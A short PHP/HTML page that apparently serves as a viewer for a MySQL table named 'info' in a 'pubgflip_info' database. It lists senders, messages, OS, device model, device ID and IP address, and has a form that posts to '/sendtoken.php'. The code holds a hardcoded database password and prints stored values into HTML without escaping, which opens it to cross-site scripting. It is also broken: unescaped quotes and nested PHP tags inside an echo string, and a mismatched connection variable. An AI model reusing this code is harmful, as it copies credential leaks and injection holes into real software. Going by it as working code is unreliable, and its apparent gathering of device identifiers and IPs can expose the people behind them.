<html>
    <body>
        <form action="/sendtoken.php">
  <input type="submit" value="Submit">
</form> 
<?php
$con=mysqli_connect("localhost","pubgflip","S1789163s1@#","pubgflip_info")
or die('Unable to connect');
echo "connected";
$result=mysqli_query($con,"select * from info");
echo"<center><h1>MESSAGES</h1></center>


 
<br><table border='1'>
";
while($row=mysqli_fetch_array($result))
{
	echo"<tr><td>From:".$row['sender']."<br>";
	echo"Message:".$row['msg']."<br>";
		echo"Os:".$row['os']."<br>";
			echo"Model:".$row['model']."<br>";
			echo"Device id:".$row['id']."<br>";
				echo"Ip:".$row['ip']."<button name="subject" type="submit" value="<?php echo $row['id']; ?>"><?php echo $row['id']; ?></button></td></tr>";
}
echo"</table>";
mysqli_close($conn);
?>

</body>
</body>
</html>